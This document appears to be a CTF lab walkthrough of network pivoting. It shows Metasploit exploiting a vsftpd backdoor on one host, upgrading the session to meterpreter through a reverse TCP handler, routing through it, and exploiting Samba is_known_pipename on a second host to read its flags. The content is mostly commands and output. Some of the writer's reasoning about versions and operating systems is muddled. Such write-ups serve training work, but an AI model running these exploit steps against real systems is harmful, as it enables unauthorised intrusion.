@@ -1,0 +1,432 @@
+In this pivoting challenge, the network architecture is as shown below:
+
+Kali  ----------->   Target A -------------> Target B
+
+Your mission is to get the flags kept in flagX.txt file on both Target A and Target B.
+
+Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
+The Target A should be located at the IP address 192.X.Y.3. 
+Once you compromise Target A, you should be able to use that as a pivot to exploit Target B
+
+#######################################################################################
+
+kali interface:
+
+#######################################################################################
+root@attackdefense:~# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.1.1.9  netmask 255.255.255.0  broadcast 10.1.1.255
+        ether 02:42:0a:01:01:09  txqueuelen 0  (Ethernet)
+        RX packets 82  bytes 8079 (7.8 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 75  bytes 325442 (317.8 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.107.29.2  netmask 255.255.255.0  broadcast 192.107.29.255
+        ether 02:42:c0:6b:1d:02  txqueuelen 0  (Ethernet)
+        RX packets 18  bytes 1452 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 2076 (2.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 2076 (2.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@attackdefense:~#
+
+#############################################################################################
+
+Our target IP Address is : 192.107.29.3
+
+#####################################################################################################
+
+Run a nmap scan : nmap -sC -sV -p- 192.107.29.3
+
+#######################################################################################################
+
+root@attackdefense:~# nmap -sC -sV -p- 192.107.29.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-05 18:32 UTC
+Nmap scan report for e190h2r8d07kvrhoqj9igx2xq.temp-network_a-107-29 (192.107.29.3)
+Host is up (0.000024s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable anonymous root".
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 87:26:5e:08:a8:ce:be:56:6b:f3:0e:06:de:5d:12:e6 (DSA)
+|   2048 e0:03:18:cf:30:6f:12:49:d7:44:40:2e:aa:ec:e9:db (RSA)
+|   256 14:2d:2c:5a:cc:66:2c:72:b0:de:c0:de:ab:41:7c:5c (ECDSA)
+|_  256 ee:d1:70:11:25:29:17:f0:ee:05:36:a4:92:9c:88:28 (ED25519)
+MAC Address: 02:42:C0:6B:1D:03 (Unknown)
+Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
+root@attackdefense:~#
+
+
+##########################################################################################################
+
+We have found 2 open port 21(ftp) with vsftpd 2.0.8 or later service and 22(ssh) with OpenSSH 6.6.1p1.
+After doing a bit enumeraction about the vsftpd we have found that this vsftpd 2.0.8 or later is 
+vulnerable to vsftpd backdoor vulnerability.
+
+https://www.exploit-db.com/exploits/17491
+
+##########################################################################################################
+
+root@attackdefense:~# service postgresql start
+[ ok ] Starting PostgreSQL 11 database server: main.
+root@attackdefense:~# msfconsole
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v5.0.0-dev-64c629e75a                ]
++ -- --=[ 1836 exploits - 1038 auxiliary - 319 post       ]
++ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
++ -- --=[ ** This is Metasploit 5 development branch **   ]
+
+msf5 > search vsftpd
+
+Matching Modules
+================
+
+   Name                                  Disclosure Date  Rank       Check  Description
+   ----                                  ---------------  ----       -----  -----------
+   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target address range or CIDR identifier
+   RPORT   21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.107.29.3
+rhosts => 192.107.29.3
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.107.29.3:21 - Banner: 220 Welcome to AttackDefense target FTP service.
+[*] 192.107.29.3:21 - USER: 331 Please specify the password.
+[+] 192.107.29.3:21 - Backdoor service has been spawned, handling...
+[+] 192.107.29.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.107.29.2:41633 -> 192.107.29.3:6200) at 2019-02-05 18:39:40 +0000
+
+ifconfig
+
+eth0      Link encap:Ethernet  HWaddr 02:42:c0:6b:1d:03
+          inet addr:192.107.29.3  Bcast:192.107.29.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:65796 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:65746 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          RX bytes:4686517 (4.6 MB)  TX bytes:3572274 (3.5 MB)
+
+eth1      Link encap:Ethernet  HWaddr 02:42:c0:27:b8:02
+          inet addr:192.39.184.2  Bcast:192.39.184.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:79 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          RX bytes:10319 (10.3 KB)  TX bytes:0 (0.0 B)
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+          
+###########################################################################################################
+We have found that target A machine is connected with two(eth0 and eth1) network. We can not reached
+TARGET B fron our kali machine. our kali machine is on diffrent network and target B is on the diffrent network but target A is on the both network.
+so we will exploit target B from our kali machine via target A route(eth1) along with session metrepreter session.
+
+We have to upgrade our shell to meterpreter shell.
+############################################################################################################
+
+cat /root/flag.txt
+58c7c29a8abXXXXXXXXXXXXXXXXXXXXa
+
+background
+Background session 1? [y/N]  Y
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               192.107.29.2:41633 -> 192.107.29.3:6200 (192.107.29.3)
+
+
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > use post/multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) > set session 1
+session => 1
+msf5 post(multi/manage/shell_to_meterpreter) > exploit
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.107.29.2:4433
+[*] Sending stage (861480 bytes) to 192.107.29.3
+[*] Meterpreter session 2 opened (192.107.29.2:4433 -> 192.107.29.3:58306) at 2019-02-05 18:48:56 +0000
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+msf5 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                  Connection
+  --  ----  ----                   -----------                                  ----------
+  1         shell cmd/unix                                                      192.107.29.2:41633 -> 192.107.29.3:6200 (192.107.29.3)
+  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.107.29.3  192.107.29.2:4433 -> 192.107.29.3:58306 (192.107.29.3)
+
+######################################################################################################################
+
+Frist we want to scan the whole network so that we came to know the other machines on the network but as we can not reach
+target B from our kali machine directly so we have to add our route with gateway and session.
+
+#######################################################################################################################
+
+msf5 post(multi/manage/shell_to_meterpreter) > route add 192.39.184.2 255.255.255.0 2
+[*] Route added
+msf5 post(multi/manage/shell_to_meterpreter) > route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   192.39.184.2       255.255.255.0      Session 2
+
+[*] There are currently no IPv6 routes defined.
+
+#########################################################################################################################
+
+Now we will use auxiliary/scanner/portscan/tcp for scanning the whole network with some  port.
+
+#########################################################################################################################
+
+msf5 post(multi/manage/shell_to_meterpreter) > use auxiliary/scanner/portscan/tcp
+msf5 auxiliary(scanner/portscan/tcp) > show options
+
+Module options (auxiliary/scanner/portscan/tcp):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   CONCURRENCY  10               yes       The number of concurrent ports to check per host
+   DELAY        0                yes       The delay between connections, per thread, in milliseconds
+   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS                        yes       The target address range or CIDR identifier
+   THREADS      1                yes       The number of concurrent threads
+   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
+
+msf5 auxiliary(scanner/portscan/tcp) > set rhosts 192.39.184.0/24
+rhosts => 192.39.184.0/24
+msf5 auxiliary(scanner/portscan/tcp) > show options
+
+Module options (auxiliary/scanner/portscan/tcp):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   CONCURRENCY  10               yes       The number of concurrent ports to check per host
+   DELAY        0                yes       The delay between connections, per thread, in milliseconds
+   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS       192.39.184.0/24  yes       The target address range or CIDR identifier
+   THREADS      1                yes       The number of concurrent threads
+   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
+
+msf5 auxiliary(scanner/portscan/tcp) > set ports 22-25,80,110-900
+ports => 22-25,80,110-900
+msf5 auxiliary(scanner/portscan/tcp) > show options
+
+Module options (auxiliary/scanner/portscan/tcp):
+
+   Name         Current Setting   Required  Description
+   ----         ---------------   --------  -----------
+   CONCURRENCY  10                yes       The number of concurrent ports to check per host
+   DELAY        0                 yes       The delay between connections, per thread, in milliseconds
+   JITTER       0                 yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
+   PORTS        22-25,80,110-900  yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS       192.39.184.0/24   yes       The target address range or CIDR identifier
+   THREADS      1                 yes       The number of concurrent threads
+   TIMEOUT      1000              yes       The socket connect timeout in milliseconds
+
+msf5 auxiliary(scanner/portscan/tcp) > run
+
+[+] 192.39.184.1:         - 192.39.184.1:22 - TCP OPEN
+[+] 192.39.184.2:         - 192.39.184.2:22 - TCP OPEN
+[+] 192.39.184.3:         - 192.39.184.3:139 - TCP OPEN
+[+] 192.39.184.3:         - 192.39.184.3:445 - TCP OPEN
+
+##############################################################################################################
+
+We have found put TARGET B ipaddress(192.39.184.3) along with port open 139 and 445. Both port is use for the smb service.
+
+###############################################################################################################
+
+msf5 auxiliary(scanner/portscan/tcp) > search smb
+
+###############################################################################################################
+
+We got huge smb list of exploits but our goal is to find more information about the system target and running service version.
+therefore we will use admin smb auxilary;
+
+auxiliary(admin/smb/ms17_010_command)
+
+#################################################################################################################
+
+msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/admin/smb/ms17_010_command
+msf5 auxiliary(admin/smb/ms17_010_command) > show options
+
+Module options (auxiliary/admin/smb/ms17_010_command):
+
+   Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   COMMAND               net group "Domain Admins" /domain                               yes       The command you want to execute on the remote host
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                yes       The target address range or CIDR identifier
+   RPORT                 445                                                             yes       The Target port
+   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBSHARE              C$                                                              yes       The name of a writeable share on the server
+   SMBUser                                                                               no        The username to authenticate as
+   THREADS               1                                                               yes       The number of concurrent threads
+   WINPATH               WINDOWS                                                         yes       The name of the remote Windows directory
+
+msf5 auxiliary(admin/smb/ms17_010_command) > set rhosts 192.39.184.3
+rhosts => 192.39.184.3
+msf5 auxiliary(admin/smb/ms17_010_command) > exploit
+
+[*] 192.39.184.3:445      - Target OS: Windows 6.1
+[-] 192.39.184.3:445      - Exploit unavailable for target OS.
+[*] 192.39.184.3:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+##############################################################################################################################
+
+
+We got a bit more information about the target OS: Windows 6.1
+
+After doing a bit enumeration on windows 6.1, We have out that it is vulnerable to samba/is_known_pipename. 
+
+##############################################################################################################################
+
+msf5 auxiliary(admin/smb/ms17_010_command) > use exploit/linux/samba/is_known_pipename
+msf5 exploit(linux/samba/is_known_pipename) > show options
+
+Module options (exploit/linux/samba/is_known_pipename):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   RHOSTS                           yes       The target address range or CIDR identifier
+   RPORT           445              yes       The SMB service port (TCP)
+   SMB_FOLDER                       no        The directory to use within the writeable SMB share
+   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Interact)
+
+
+msf5 exploit(linux/samba/is_known_pipename) > set rhosts 192.39.184.3
+rhosts => 192.39.184.3
+msf5 exploit(linux/samba/is_known_pipename) > exploit
+
+[*] 192.39.184.3:445 - Using location \\192.39.184.3\share\ for the path
+[*] 192.39.184.3:445 - Retrieving the remote path of the share 'share'
+[*] 192.39.184.3:445 - Share 'share' has server-side path '/tmp/
+[*] 192.39.184.3:445 - Uploaded payload to \\192.39.184.3\share\vHDstCio.so
+[*] 192.39.184.3:445 - Loading the payload from server-side path /tmp/vHDstCio.so using \\PIPE\/tmp/vHDstCio.so...
+[-] 192.39.184.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+[*] 192.39.184.3:445 - Loading the payload from server-side path /tmp/vHDstCio.so using /tmp/vHDstCio.so...
+[+] 192.39.184.3:445 - Probe response indicates the interactive payload was loaded...
+[*] Found shell.
+[*] Command shell session 3 opened (192.107.29.2-192.107.29.3:0 -> 192.39.184.3:445) at 2019-02-05 19:25:14 +0000
+
+
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+7031: eth0@if7032: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:c0:27:b8:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 192.39.184.3/24 brd 192.39.184.255 scope global eth0
+       valid_lft forever preferred_lft forever
+
+
+#########################################################################################################################
+
+ls -la
+total 8
+drwxrwxrwt 1 root root 4096 Feb  5 19:25 .
+drwxr-xr-x 1 root root 4096 Feb  5 18:28 ..
+cd /
+pwd
+/
+cd root
+ls -la
+drwx------ 1 root root 4096 Oct 11 00:03 .
+drwxr-xr-x 1 root root 4096 Feb  5 18:28 ..
+drwx------ 2 root root 4096 Oct 10 01:22 .aptitude
+-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-rw-r--r-- 1 root root   33 Oct 11 00:03 flag.txt
+-rwxr-xr-x 1 root root   65 Oct 10 01:23 start.sh
+
+cat flag.txt
+5a53298XXXXXXXXXXXXXX9581650eceb
+
+#####################################################################################################################
+
